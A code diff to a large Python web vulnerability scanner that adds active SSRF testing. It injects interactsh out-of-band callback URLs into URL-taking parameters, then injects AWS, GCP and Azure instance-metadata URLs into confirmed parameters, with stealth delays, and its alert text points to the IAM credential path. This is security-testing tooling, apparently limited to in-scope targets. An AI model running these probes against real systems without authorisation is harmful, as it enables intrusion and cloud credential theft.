@@ -6216,6 +6216,8 @@ def main_crawler(start_url, same_domain_only=False, resume=False, ignore_robots=
             scan_deserial_passive(url, html, headers)
             # Active probe checks — only run when --active-probes is enabled
             if ACTIVE_PROBES:
+                # SSRF OOB confirmation — interactsh callback for URL-accepting params
+                check_ssrf_oob(url, html)
                 # Open redirect detection — probes URL params with canary URL
                 check_open_redirects(url, html)
                 # GraphQL introspection — probe if this URL looks like a GraphQL endpoint
@@ -7495,6 +7497,336 @@ def flag_ssrf_candidates(page_url, html_content):
                 f"URL-accepting parameters found — manually test for SSRF: {param_list}"
             )
         print(timestamp() + f" SSRF candidates on {domain}: {param_list}")
+
+
+# ─────────────────────────────────────────────
+# SSRF OOB confirmation (interactsh)
+# ─────────────────────────────────────────────
+
+# Optional dependency — graceful fallback if not installed
+try:
+    from interactsh.client import InteractshClient as _InteractshClient
+    _INTERACTSH_AVAILABLE = True
+except ImportError:
+    _INTERACTSH_AVAILABLE = False
+
+# Session-scoped OOB client (one instance per process, shared across domains)
+_ssrf_oob_client: object = None
+_ssrf_oob_base_url: str  = ""
+
+# Per-domain dedup — (base_url, param) pairs already OOB-probed
+_ssrf_tested: set = set()
+
+# Cloud metadata probe table — (url, indicators, label)
+# Paths are safe/non-sensitive: they confirm reachability only, not credentials.
+_SSRF_CLOUD_PROBES: list = [
+    ("http://169.254.169.254/latest/meta-data/",
+     ["ami-id", "instance-id", "instance-type", "local-ipv4"],
+     "AWS IMDSv1"),
+    ("http://169.254.169.254/latest/api/token",
+     ["EC2-IMDS", "instance-id"],
+     "AWS IMDSv2 token endpoint"),
+    ("http://metadata.google.internal/computeMetadata/v1/",
+     ["computeMetadata", "instance-id", "serviceAccounts"],
+     "GCP Metadata"),
+    ("http://169.254.169.254/metadata/instance",
+     ["azureMetadata", "vmId", "subscriptionId", "instance-id"],
+     "Azure IMDS"),
+]
+
+
+def _ssrf_setup_oob() -> tuple:
+    """
+    Lazily initialise the interactsh OOB client for the current scan session.
+    Returns (client, oob_url) on success, or (None, "") if the package is not
+    installed or registration fails.
+    """
+    global _ssrf_oob_client, _ssrf_oob_base_url
+    if _ssrf_oob_client is not None:
+        return _ssrf_oob_client, _ssrf_oob_base_url
+    if not _INTERACTSH_AVAILABLE:
+        return None, ""
+    try:
+        client = _InteractshClient(
+            server="interact.sh",
+            token="",
+            disable_http_fallback=False,
+        )
+        url = getattr(client, "interactsh_url", None) or ""
+        if not url:
+            return None, ""
+        _ssrf_oob_client   = client
+        _ssrf_oob_base_url = url
+        print(timestamp() + f" [SSRF] OOB client registered: {url}")
+        return client, url
+    except Exception as exc:
+        print(timestamp() + f" [SSRF] interactsh-client init failed "
+              f"({str(exc)[:80]}) — blind fallback active")
+        return None, ""
+
+
+def _ssrf_poll_interactions(client, timeout_s: int = 10) -> list:
+    """
+    Poll the interactsh client for up to *timeout_s* seconds, checking every
+    second.  Returns a list of interaction dicts (may be empty on timeout).
+    Each dict contains at least: protocol, remote-address (varies by version).
+    """
+    if client is None:
+        return []
+    deadline = time.monotonic() + timeout_s
+    while time.monotonic() < deadline:
+        try:
+            data = client.get_interactions()
+            if data:
+                return data if isinstance(data, list) else (data.get("data") or [])
+        except Exception:
+            pass
+        time.sleep(1)
+    return []
+
+
+def _ssrf_resolve_target_ip(url: str) -> str:
+    """Return the IPv4 address of *url*'s hostname, or "" on failure."""
+    try:
+        host = urlparse(url).hostname or ""
+        return socket.gethostbyname(host) if host else ""
+    except Exception:
+        return ""
+
+
+def _ssrf_classify_interaction(interactions: list, target_ip: str) -> tuple:
+    """
+    Classify a set of OOB interactions.
+    Returns (confirmed: bool, severity: str, detail: str).
+
+    HIGH  — at least one interaction came from the target server's own IP.
+    MEDIUM — interaction received but source IP is unexpected (CDN / DNS resolver).
+    """
+    if not interactions:
+        return False, "", ""
+
+    protos  = [str(i.get("protocol", "")).lower() for i in interactions if i.get("protocol")]
+    src_ips = [str(i.get("remote-address", "")).split(":")[0] for i in interactions]
+    proto_s = "/".join(sorted(set(p for p in protos if p))) or "unknown"
+    ip_s    = ", ".join(sorted(set(i for i in src_ips if i))) or "unknown"
+
+    direct = bool(target_ip and any(ip == target_ip for ip in src_ips if ip))
+
+    if direct:
+        return True, "HIGH", (
+            f"OOB {proto_s.upper()} interaction received from target IP {target_ip} "
+            f"— SSRF is directly exploitable."
+        )
+    return True, "MEDIUM", (
+        f"OOB {proto_s.upper()} interaction received from {ip_s} "
+        f"— source does not match target IP {target_ip or '(unresolved)'}; "
+        f"may be CDN/DNS resolver. Manual confirmation required."
+    )
+
+
+def _ssrf_check_cloud_metadata(
+    base: str, param: str, params: dict, domain: str
+) -> None:
+    """
+    Inject cloud metadata URLs into a confirmed SSRF parameter and check whether
+    the server reflects metadata indicators in the response body.
+
+    Only called after OOB SSRF confirmation.
+    Uses safe/non-sensitive metadata paths — no IAM credential paths are accessed.
+    """
+    for meta_url, indicators, cloud_label in _SSRF_CLOUD_PROBES:
+        new_query = "&".join(
+            f"{k}={meta_url}" if k == param else f"{k}={v}"
+            for k, v in params.items()
+        )
+        test_url = base + "?" + new_query
+        try:
+            stealth_delay(domain)
+            resp    = _get_session().get(
+                test_url,
+                headers=create_request_header(),
+                timeout=10,
+                allow_redirects=True,
+            )
+            body    = resp.text or ""
+            matched = [ind for ind in indicators if ind.lower() in body.lower()]
+            if matched:
+                alert(
+                    "SSRF: CLOUD METADATA ACCESSIBLE",
+                    "CRITICAL",
+                    test_url,
+                    f"SSRF-confirmed parameter '{param}' on {base} returned "
+                    f"{cloud_label} indicators: {matched!r}. "
+                    f"Full IAM credential exposure may be possible via "
+                    f"/latest/meta-data/iam/security-credentials/. "
+                    f"Payload: {meta_url!r}",
+                )
+                print(timestamp() + f" [!!!] SSRF cloud metadata ({cloud_label}) at {base}")
+                return   # one confirmed cloud provider is enough
+        except Exception:
+            pass
+
+
+def check_ssrf_oob(page_url: str, html_content) -> None:
+    """
+    OOB-confirmed SSRF detection using interactsh.
+
+    For each URL-accepting parameter (SSRF_PARAM_NAMES) found on the page,
+    injects interactsh subdomain URLs and polls for DNS/HTTP callbacks.
+
+      CONFIRMED HIGH  — OOB interaction received from the target server's IP.
+      LIKELY MEDIUM   — OOB interaction received from unexpected IP
+                        (CDN, public DNS resolver).
+      LOW             — No OOB interaction within 10s; or interactsh-client
+                        not installed (blind fallback).
+
+    If OOB SSRF is confirmed (HIGH or MEDIUM), additionally probes for cloud
+    metadata access (AWS/GCP/Azure IMDS) via the same parameter and flags
+    CRITICAL if metadata indicators appear in the response body.
+
+    Blind fallback: if interactsh-client is not installed, emits a LOW
+    NEEDS VERIFICATION alert and notes that OOB detection was unavailable.
+
+    Only called when --active-probes is enabled.
+    Deduplicates per (base_url, param) pair.
+    10-second request timeout + 10-second polling window per probe.
+    """
+    if not is_in_scope(page_url):
+        return
+    domain = urlparse(page_url).netloc
+    if is_third_party_cdn(domain):
+        return
+
+    try:
+        text = html_content if isinstance(html_content, str) \
+               else html_content.decode("utf-8", errors="ignore")
+        soup = BeautifulSoup(text, "lxml")
+    except Exception:
+        return
+
+    # ── Collect candidate (base, param, params_dict) tuples ──────────────────
+    candidates: list[tuple[str, str, dict]] = []
+
+    def _collect(raw_url: str) -> None:
+        try:
+            resolved = urljoin(page_url, raw_url)
+            parsed   = urlparse(resolved)
+            if is_third_party_cdn(parsed.netloc):
+                return
+            if not parsed.query:
+                return
+            base   = parsed.scheme + "://" + parsed.netloc + parsed.path
+            params: dict = {}
+            for pair in parsed.query.split("&"):
+                if "=" in pair:
+                    k, v = pair.split("=", 1)
+                    params[k] = v
+            for k in params:
+                if k.lower() in SSRF_PARAM_NAMES:
+                    key = (base, k)
+                    if key not in _ssrf_tested:
+                        candidates.append((base, k, params))
+        except Exception:
+            pass
+
+    _collect(page_url)
+    if soup:
+        for tag in soup.find_all(["a", "form", "link"]):
+            href = tag.get("href") or tag.get("action") or ""
+            if href:
+                _collect(href)
+
+    if not candidates:
+        return
+
+    # ── Setup OOB client (lazy; reused for the entire scan session) ───────────
+    oob_client, oob_url = _ssrf_setup_oob()
+    oob_available = oob_client is not None and bool(oob_url)
+
+    target_ip  = _ssrf_resolve_target_ip(page_url)
+    waf_note   = ""
+    waf_vendor = _waf_results.get(domain)
+    if waf_vendor:
+        waf_note = f" [WAF: {waf_vendor} detected]"
+
+    for base, param, params in candidates:
+        key = (base, param)
+        if key in _ssrf_tested:
+            continue
+        _ssrf_tested.add(key)
+
+        print(timestamp() + f" SSRF OOB probe: {base} param={param}")
+
+        if not oob_available:
+            # ── Blind fallback ────────────────────────────────────────────────
+            alert(
+                "SSRF CANDIDATE (OOB UNAVAILABLE)",
+                "LOW",
+                base,
+                f"Parameter '{param}' on {base} accepts URLs. "
+                f"OOB detection unavailable — install interactsh-client "
+                f"(pip install interactsh-client) for automated confirmation. "
+                f"Manual verification required.{waf_note}",
+            )
+            continue
+
+        # ── OOB probes ────────────────────────────────────────────────────────
+        oob_payloads = [
+            f"http://{oob_url}",
+            f"https://{oob_url}",
+            f"http://{oob_url}/nuscrape-ssrf-test",
+        ]
+        for payload in oob_payloads:
+            new_query = "&".join(
+                f"{k}={payload}" if k == param else f"{k}={v}"
+                for k, v in params.items()
+            )
+            try:
+                stealth_delay(domain)
+                _get_session().get(
+                    base + "?" + new_query,
+                    headers=create_request_header(),
+                    timeout=10,
+                    allow_redirects=True,
+                )
+            except Exception:
+                pass
+
+        # ── Poll for interactions ─────────────────────────────────────────────
+        print(timestamp() + f" [SSRF] Polling OOB (10s) for {base} param={param} ...")
+        interactions = _ssrf_poll_interactions(oob_client, timeout_s=10)
+        confirmed, sev, oob_detail = _ssrf_classify_interaction(interactions, target_ip)
+
+        if confirmed:
+            proto_s = "/".join(sorted(set(
+                str(i.get("protocol", "")).upper()
+                for i in interactions if i.get("protocol")
+            ))) or "OOB"
+            alert(
+                f"SSRF CONFIRMED ({proto_s} INTERACTION)",
+                sev,
+                base,
+                f"Parameter '{param}' on {base} triggered OOB callback. "
+                f"{oob_detail} Payload: {oob_payloads[0]!r}{waf_note}",
+            )
+            if sev == "HIGH":
+                print(timestamp() + f" [!!] SSRF confirmed (direct OOB) at {base} param={param}")
+            else:
+                print(timestamp() + f" [!] SSRF likely (OOB, unexpected IP) at {base} param={param}")
+
+            # Cloud metadata probe only for confirmed endpoints
+            _ssrf_check_cloud_metadata(base, param, params, domain)
+
+        else:
+            alert(
+                "SSRF CANDIDATE (NO OOB INTERACTION)",
+                "LOW",
+                base,
+                f"Parameter '{param}' on {base} accepts URLs but no OOB "
+                f"interaction was received within 10s. Server may block "
+                f"outbound connections, use an allowlist, or DNS is not "
+                f"leaking. Manual verification recommended.{waf_note}",
+            )
 
 
 # ─────────────────────────────────────────────
@@ -13070,6 +13402,7 @@ def _reset_per_domain_state() -> None:
     global _deserial_passive_seen, _deserial_active_tested
     global _price_tested, _jwt_tested, _hpp_tested, _wcp_tested, _probe_baseline, _entropy_seen
     global _timing_profiles
+    global _ssrf_flagged, _ssrf_tested
     global _idor_tested, _takeover_checked, _s3_checked, _s3_permutation_checked
     global _subdomain_enriched, _ct_queried, _cookie_seen, _js_analysis_threads
     _zone_transfer_checked  = set()
@@ -13123,6 +13456,9 @@ def _reset_per_domain_state() -> None:
     _probe_baseline         = {}
     _entropy_seen           = set()
     _timing_profiles        = {}
+    _ssrf_flagged           = set()
+    _ssrf_tested            = set()
+    # Note: _ssrf_oob_client and _ssrf_oob_base_url are session-scoped and NOT reset
     _idor_tested            = set()
     _takeover_checked       = set()
     _s3_checked             = set()
